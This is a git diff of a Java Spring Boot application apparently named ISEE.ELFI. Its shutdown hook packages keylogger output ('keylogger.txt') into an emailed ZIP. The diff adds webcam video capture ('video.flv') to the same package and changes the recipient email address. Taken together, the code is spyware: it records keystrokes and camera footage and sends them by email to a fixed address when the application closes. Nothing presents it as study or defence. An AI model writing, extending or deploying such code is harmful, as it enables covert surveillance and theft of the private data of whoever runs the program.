@@ -1,5 +1,6 @@
 package com.isee.elfi;
 
+import org.opencv.videoio.VideoCapture;
 import org.springframework.boot.SpringApplication;
 import org.springframework.boot.autoconfigure.SpringBootApplication;
 
@@ -49,9 +50,8 @@ public class ElfiApplication {
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
             System.out.println("Application is closing...");
             recorder.stopRecording();
-
             // Example: Use the com.isee.elfi.FileZipper class to zip a file
-            String toEmail = "ozgurcoderr@gmail.com";
+            String toEmail = "mertayhandev@gmail.com";
             String subject = "ISEE.ELFI DENEME";
             String bodyText = "This email contains a ZIP file attachment.";
 
@@ -75,6 +75,17 @@ public class ElfiApplication {
                     if (logBytes != null) {
                         fileContents.put("keylogger.txt", logBytes);
                         System.out.println("Keylogger log saved to file and added to the map.");
+                    }
+                } catch (Exception e) {
+                    System.out.println(e.getMessage());
+                }
+
+                try {
+                    CameraCapture.close();
+                     byte[] videoByte = CameraCapture.videoByte;
+                    if (videoByte != null) {
+                        fileContents.put("video.flv", videoByte);
+                        System.out.println("Video byte saved to file and added to the map.");
                     }
                 } catch (Exception e) {
                     System.out.println(e.getMessage());
